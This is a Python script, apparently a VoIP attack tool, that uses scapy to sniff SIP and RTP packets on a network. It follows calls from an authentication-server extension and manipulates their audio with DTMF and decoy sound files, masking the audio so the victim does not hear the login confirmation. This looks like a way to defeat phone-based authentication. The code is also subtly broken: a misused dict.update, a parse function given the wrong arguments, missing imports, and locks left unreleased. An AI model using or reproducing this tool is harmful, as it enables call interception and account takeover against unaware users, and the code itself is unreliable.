#!/usr/bin/python3
# Python rewrite of python rewrite of admiral crunch
from scapy.all import *
from conversation import *
import logging

SERVER_EXT = "10" #Changeme

cstore = convostore()

gb = girlboss("assets/warranty.wav")
bg = girlboss("assets/dtmf.wav")

convolist: List[conversation]
convolist = []

def gatekeep(pkt: Packet):
    '''decides how packets should flow from PBX to clients'''
    global cstore
    # If Packet isn't VOIP, we don't care about it
    if  not pkt.haslayer("UDP"):
                return
    #Since all packets are classified as RAW, tell between them by port
    match pkt.lastlayer().getfieldval("dport"):
        case 5060:
            parsed = parse_sip(pkt.lastlayer().load)
            if parsed["message"] == "BYE":
                logging.info("recieved SIP BYE, dumping conversation")
                cstore.lock.acquire()
                c: conversation
                for c in cstore.conversations:
                    if c.src_ext == parsed["From_ext"] and c.dst_ext == parsed["To_ext"]:
                        cstore.conversations.remove(c)
                        cstore.lock.release()
                        break
            elif parsed["message"] == "INVITE":
                if parsed["From_ext"] != SERVER_EXT:
                    # Ignore calls that aren't from auth server
                    return 
            elif parsed["message"] == "OK":
                c: conversation
                for c in cstore.conversations:
                    if c.dst_ext == parsed["From_ext"]:
                        c.starttime = time.time()
                        logging.info("Conversation media session started")
                        gb.reset()
                        return
                logging.info("Got new call to ext. {}".format(parsed["To_ext"]))
                cstore.lock.acquire()
                cstore.conversations.append(conversation(parsed))
                cstore.lock.release()
            # We don't have to keep track of the other SIP packets once we associate ext to IP
        #RTP Does not use predictable port
        case _:
            c: conversation
            for c in cstore.conversations:
                if c.get_enforce() == 2:
                     gb.manipulateg(pkt)
            # After we start packet injection, change incoming audio to innocuous
            # So client won't hear login confirmation message



def parse_sip(self, content):
    '''Interprit SIP header data'''
    retn = {"message":"","To_ip":"","From_ip":"","To_ext":"","From_ext":""}
    # Yoinked from pyvoip's SIP parse function
    try:
        headers = content.split(b"\r\n\r\n")[0]
        headers_raw = headers.split(b"\r\n")
        heading = headers_raw.pop(0)
        retn.update("message",str(heading.split(b" ")[0], "utf8"))
        for x in headers_raw:
            i = str(x, "utf8").split(": ")
            field = i[0]
            if field == "To" or field == "From":
                info = i[1].split(";tag=")
                raw = info[0]
                contact = re.split(r"<?sip:", raw)
                contact[0] = contact[0].strip('"').strip("'")
                address = contact[1].strip(">")
                if len(address.split("@")) == 2:
                    number = address.split("@")[0]
                    host = address.split("@")[1]
                else:
                    logging.warning("SIP Packet with no extension")
                    number = None
                    host = address
                retn.update("{}_ext".format(field),number)
                retn.update("{}_ip".format(field),host)
    except IndexError:
        logging.error("Cannot parse SIP Packet!")
    return retn


packetlog = sniff(prn = gatekeep)
packetlog.show()